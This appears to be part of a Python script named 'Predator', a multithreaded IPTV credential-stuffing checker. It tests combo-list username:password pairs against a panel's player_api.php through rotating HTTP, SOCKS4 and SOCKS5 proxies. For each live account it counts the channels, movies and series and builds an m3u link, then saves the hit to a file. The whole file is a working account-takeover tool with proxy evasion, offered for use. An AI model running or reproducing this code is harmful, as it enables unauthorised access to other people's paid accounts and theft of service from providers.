            m3u_result="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ⧪
├● """+link_status+""" """+invpn+"""
╰● 📺 𝙈3𝙐 ➤ """+m3u_link+"""

╭❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ⧪
├● 🛑 OFFLINE """+invpn+"""
╰❪🔘❫ 🎲 𝙋𝙇𝘼𝙔 ➤ Not URL
     """
            print(m3u_result)
        return m3u_result, link_status  

    
    def onay(veri,user,pas,proxysprint):
    		global hitr, fakehit		
    		fakehit=0
    		status=veri.split('status":')[1]
    		status=status.split(',')[0]
    		status=status.replace('"',"")

    		playsound('./Python_Portable/settings/sounds/ching.mp3')    		  		
    		
    		
    		acon=""
    		acon=veri.split('active_cons":')[1]
    		acon=acon.split(',')[0]
    		acon=acon.replace('"',"")
    		mcon=veri.split('max_connections":')[1]
    		mcon=mcon.split(',')[0]
    		mcon=mcon.replace('"',"")
    		timezone=veri.split('timezone":"')[1]
    		timezone=timezone.split('",')[0]
    		timezone=timezone.replace("\/","/")
    		realm=veri.split('url":')[1]
    		realm=realm.split(',')[0]
    		realm=realm.replace('"',"")
    		port=veri.split('port":')[1]
    		port=port.split(',')[0]
    		port=port.replace('"',"")
    		user=veri.split('username":')[1]
    		user=user.split(',')[0]
    		user=user.replace('"',"")
    		passw=veri.split('password":')[1]
    		passw=passw.split(',')[0]
    		passw=passw.replace('"',"")
    		bitis=veri.split('exp_date":')[1]
    		bitis=bitis.split(',')[0]
    		bitis=bitis.replace('"',"")
    		if bitis=="null":
    			   bitis="Unlimited"
    		else:
    			   bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
    		bitis=bitis    		
    		if kanall=="1":
    			#myip()
    			#print("kanal 1") 		
    			katelink="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"  

    			try:
    				kategori=""
    				#print("S. Kategori")
    				res = option.get(katelink,headers=HEADERd,timeout=30,verify=False)
    				#print("Ok")    				
    				veri=""
    				kate=""
    				veri=str(res.text)
    				#print(veri)    				
    				for i in veri.split('category_name":"'):
    					#print(i)
    					try:
    					 kate=kate+""" ❪🟢❫➤ """+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
    					except:pass    					  					  					
    					kate=kate.replace(" ❪🟢❫➤ [{","")
    					#print(kate)
    				kategori=kate    				
    				#print(kategori)
    			except:pass
        			
        			
    		
    		
    		url5="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
    		try:    			 
		    	 res = option.get(url5, headers=HEADERd, timeout=60, verify=False)
    			 veri=str(res.text)
    			 kanalsayisi=""    			 
    			 kanalsayisi=str(veri.count("stream_id"))    			 
    			 #print("stream_live OK")	
    		except:  
    			 kanalsayisi="❓"    		  			 
    		try:    			 
    			 url5="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
    			 res = option.get(url5, headers=HEADERd,timeout=60, verify=False)
    			 veri=str(res.text)
    			 filmsayisi=""
    			 filmsayisi=str(veri.count("stream_id"))
    			 #print("stream_VOD OK")			 
    		except:
    			 filmsayisi="❓"         		
    		try:
    			 url5="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
    			 res = option.get(url5, headers=HEADERd,timeout=60, verify=False)
    			 veri=str(res.text)
    			 dizisayisi=""
    			 dizisayisi=str(veri.count("series_id"))
    			 #print("stream_SERIES OK")	    			 			  
    		except:
    			 dizisayisi="❓"     			     			         		
    		
    		m3u_link="http://"+realm+":"+port+"/get.php?username="+user+"&password="+passw+"&type=m3u_plus"
    		m3u_result, link_status=m3u_check(m3u_link)  		  	    		
    		if status=="Active":
    			statusp="\n├❪🔘❫ ✅ Status ➤ "+status	
    		else:
    			status="\n├❪🔘❫ 🛑 Status ➤ "+status	
    				    		
    		sayi=""
    		if statusproxym==1:
    			modeprint="""
╭❪🟡❫ [ 🔓 𝓟𝓡𝓞𝓧𝓨 𝓜𝓞𝓓𝓔 ]
╰❪🟡❫ Proxy ➤ """+proxysprint+"""
"""  			
    		else:
    			modeprint=""    
    				  		
    		mt=("""
╭──➤ ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️
╰────[ Mod 𝓑𝔂  Papy Gogo ]
"""+modeprint+"""
╭──➤ ❪❪ 🌐 🅂🄴🅁🅅🄴🅁 🌐 ❫❫
├❪🔘❫ 🌍 𝙍𝙀𝘼𝙇 ⧪
├● """+str(realm.replace('/stalker_portal','').replace('/c',''))+"""
├❪🔘❫ 🌐 𝙋𝘼𝙉𝙀𝙇 ⧪
╰● http://"""+str(portal)+"""

╭──➤ ❪❪ 🔌 🄲🄾🄽🄽🄴🄲🅃 🔌 ❫❫
├❪🔘❫ 👩‍ User ➤ """+user+"""
├❪🔘❫ 🔑 Pass ➤ """+pas+"""
╰────────⧳

╭──➤ ℹ️ 🄸🄽🄵🄾 ℹ️"""+statusp+"""
├❪🔘❫ 📆 Exp. ➤ """+bitis+""" 
├❪🔘❫ 👩 Act Conx ➤ """+acon+"""
├❪🔘❫ 🔛 Max Online ➤ """+mcon+""" 
├❪🔘❫ ⏰ TimeZone➤ """+timezone+"""
╰────────⧳
""")
    			
    			
        		        		        		    			
    		if not kanalsayisi =="":
    			sayi=("""
╭──➤ 📜 🅼3🆄 🄸🄽🄵🄾 📜
├❪🔘❫ 📺 Channels ➤ """+kanalsayisi+"""
├❪🔘❫ 🍿 Movies ➤"""+filmsayisi+"""
├❪🔘❫ 🎬 Series ➤"""+dizisayisi+"""
╰────────⧳ """)
    		imzak=""
    		if kanall=="1":
    			imzak="""
⧪ 🅲🅾🅽🆃🅴🅽🆃Ⓛⓘⓢⓣ ⧪
 """+str(kategori)+""" """
    		mtl=(m3u_result)
    			
    			

    		if link_status == "🛑 OFFLINE":
    			fakehit=1       
    		else:
    			yaz(mt+sayi+mtl+imzak+'\n')
    		hitr=""
    	
    
    
    def yaz(kullanici): 
        dosya=open('./Hits/Predator/m3u@_'+hitn+'_PredatorM3U.txt','a+', encoding='utf-8') 
        dosya.write(kullanici) 
        dosya.close() 
    cpm=0
    hitr=""
    def echox(bot,fyzc,oranc,hit):
    	global echo, hitr,usern,pasn   	  
    	global proxysok, proxysoklen,proxysbad, proxysbadlen
    	if statusproxym==1:    		
    		proxi="""
        
╭─●\33[1;107;44m PROXY INFO \33[0m
├●\33[1;33m TOTAL =  """+str(proxyslen)+""" \33[0m
├●\33[1;33m BAD  =  """+str(proxysbadlen)+""" \33[0m 
╰●\33[1;33m GOOD =  """+str(proxysoklen)+""" \33[0m        
        
    		"""
    	else:
    		proxi=""   	
    		
    	echo=("""
\33[1m    PREDATOR   BY PROARTIX     
╭● \33[0m\33[1;107;44m m3ulink  \33[1;7m """+str(panel.replace('/stalker_portal','').replace('/c',''))+  """ \33[0m         
├●\33[1m """ +usern+""":"""+pasn+""" \33[0m
├●\33[1;33m """+hitr+"""Hits =  """+str(hit)+"""  [%"""+str(oranc)+"""]  \33[0m
├● \33[1;1mBots =  """+str(opcionbots)+        """  \33[0m \33[1;1mTotal = """+str(fyzc)+"""\33[0m
╰● \33[1;37m\33[41m Combo= \33[0m\33[1;107;44m """+str(dsyno)+""" \33[0m         
"""+proxi+"""""")
    	

    proxysok=[]
    proxysoklen=0
    proxysbad=[]
    proxysbadlen=0
    checkproxyend=0    	    
    selectprox=0
    def randomproxy():    
        global selectprox, proxysok, proxyslen, checkproxyend
        global proxysoklen,proxysbad, proxysbadlen
        dirp='./proxies/'
        say=0    
        for files in os.listdir (dirp):
            say+=1
            if str(proxyfile)==str(say):
                pdosya=(dirp+files)            
                #break            
        proxyf=open(pdosya).readlines()
    
        proxyslen=len(proxyf)
        if selectprox==proxyslen:
            proxys=random.choice(proxysok)
            checkproxyend=1      
        else:
            selectprox+=1            
            proxys=(proxyf[selectprox])    
        return proxys    	
    
    def gui():       
        refresh=0
        oranc=0
        fyzc=0                     
        while True:              
            global echo,bot,fyz, oran,hit            
            if oranc <= oran:
                oranc=oran
            if fyzc<=fyz:
                fyzc=fyz
            try:            
                echox(bot,fyzc,oranc,hit)
            except:pass
            #subprocess.run(["clear", ""]) 
            refresh+=1
            if refresh==100000:
                print("\033[H\033[J", end="")
                statusproxy()
                print(feyzo)  
                try:
                    print(echo)
                except:pass
                refresh=0

    	
    def run(opcionbots):
            
        global botsay
        t2 = threading.Thread(target=gui)
        t2.start()
        for j in range(opcionbots):
            t1 = threading.Thread(target=d1)
            t1.start()
            botsay=botsay+1
            time.sleep(2)
                 
    
    	
    hit=0	
    bot=""
    fyz=0
    fyzp=0
    oran=0
    botn=0    
    
    

    def myip():        
        url = 'http://httpbin.org/ip'
        try:
            ip = option.get(url, headers=headers, timeout=15).text        
            print(ip)
        except:pass           


    #quit()    
    def d1():
    	global fyz,oran,hit, echo, botn, pasn,usern
    	global hit, botsay, hitr, fakehit
    	global proxysok, proxysoklen,proxysbad, proxysbadlen, checkproxyend    	
    	user=""    
    	pas=""
    	botsay=0
    	say=0
    	botn=botn+1
    	botg=botn 	
    	bot="Bot => "+str(botn)
    	proxys=""   	
    	for fyz in range(botn,uz,opcionbots):
    		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
    		
    		if up:
    			 fyzz = totLen[fyz].split(":")
    			 
    			 try:
    			 	user=str(fyzz[0].replace(" ",""))
    			 except:
    			 	userr='user'
    			 try:
    			 	pas=str(fyzz[1].replace(" ",""))
    			 	pas=str(pas.replace('\n',""))
    			 except:
    			 	pas='12345'
    			 say = int(say) +1
    			 #bot='Bot_01'
    			 oran=0
    			 oran=round(((fyz)/(uz)*100),2)
    			 #portal="vplay.club:8888"    			 
    			 #user="3"
    			 #pas="3"
    			 usern=user
    			 pasn=pas
    			 bott=bot+" ["+user+":"+pas+"]"    			 
    			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
    			 bag1=0
    			 veri=""
    			 okprox=0
    			 proxyr=1
    			 proxysprint=""    			 
    			 while okprox==0:
    			 	proxyr=0	  						    	    			
    			 	if protocol==1:
    			 	 proxys=randomproxy()
    			 	 proxysprint=proxys       			          
    			 	 proxy.proxies = {
        			'https': proxys ,
        			'http': proxys
    			 	 }
    			 	if protocol==2:
    			 	 proxys=randomproxy()
    			 	 proxysprint=proxys        			          
    			 	 proxy.proxies = {
        			'https': 'socks4://'+proxys ,
        			'http': 'socks4://'+proxys
    			 	 }
    			 	if protocol==3:
    			 	 proxys=randomproxy()
    			 	 proxys='192.111.139.162:4145'     			              			 	 
    			 	 #print(proxys)
    			 	 proxysprint=proxys   
    			 	 proxy.proxies = {
        			'https': 'socks5://'+proxys ,
        			'http': 'socks5://'+proxys
    			 	 }
    			 	 
    			 	try:          
    			 	 #myip()
    			 	 #print(user+":"+pas)		 	 
    			 	 res = option.get(link,headers=HEADERd, timeout=60, verify=False) 
    			 	 proxyr=0
    			 	 #print("Ok")
    			 	except:    			 	     			 	   			 	 			 		  			 	 			 		
    			 	 proxyr=1
    			 	 proxysbad+=[proxys]
    			 	 proxysbadlen=len(proxysbad)        			 		
    			 	if proxyr==0:
			 	      			 #print("ok2")        			 	     
			 	      			 if statusproxym==1:			 	      			    			 	      			         		        		
			 	      			  if proxys in proxysok:
			 	      			   time.sleep(0.1)
			 	      			  else:
			 	      			   if checkproxyend==0:           
			 	      			    proxysok+=[proxys]
			 	      			  proxysoklen=len(proxysok)
			 	      			  			 	      			           			 	
			 	      			 veri=str(res.text)
			 	      			 #print(veri)
			 	      			 
			 	      			 if 'Cloudflare' in veri:
			 	      			     veri="Cloudflare"
			 	      			 
			 	      			 if 'username' in veri:
			 	      			     okprox=1
			 	      			     status=veri.split('status":')[1]
			 	      			     status=status.split(',')[0]
			 	      			     status=status.replace('"',"")
			 	      			     if status=='Active':
			 	      			     	hit=hit+1
			 	      			     	hitr="\33[1;36m"
			 	      			     	onay(veri,user,pas,proxysprint)
			 	      			     	if fakehit==1:
			 	          			     hit=hit-1
			 	      			 else:			 	      			    
			 	      			         okprox=1    
			 	

  			     	
    run(opcionbots)	 			
			 			 			 						 			 			